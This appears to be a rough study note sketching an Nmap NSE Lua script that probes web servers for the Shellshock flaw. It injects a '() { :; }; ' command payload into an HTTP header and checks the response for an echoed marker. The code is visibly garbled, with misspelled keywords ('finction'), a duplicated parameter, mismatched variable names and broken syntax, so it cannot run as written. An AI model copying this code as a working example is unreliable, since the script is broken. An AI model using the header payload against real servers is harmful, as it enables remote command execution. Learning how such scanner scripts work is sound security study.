# lUA language
-- comments

# NSE script example
-- The Head
local http = require "http"
local shortport = require "shortport"
local string = require "string"
local vulns = require "vulns"


description = [[ sample description ]]
author = {"john doe <email>"}
license = "GPL"
categories = {"exploit","intrusive"}
-- The Rule
portrule = shortport.http

function my_http_req(h,p,u,h,cmd)
    marker = "1234"
    option["header"][h] = "() { :; }; " .. cmd .."; echo " .. marker
    local req = http.get(h,p,u,options)
    return req, marker
end

-- The Action
action = finction(host,port)
local u = stdnse.get_script_args(SCRIPT..)
    local req, marker = my_http_req(h,p,u,h,cmd)
    if req.status == 200 and string.match(req.body, marker) ~= nil then
        local vuln_report = vulns.Report:new(SCRIPT_NAME, h, p)
        local vuln = {
            title = ""
            description = [[ description]]
        }
        vuln.state = vulns.STATE.EXPLOIT
        return vuln report:make output(vuln)
    end
end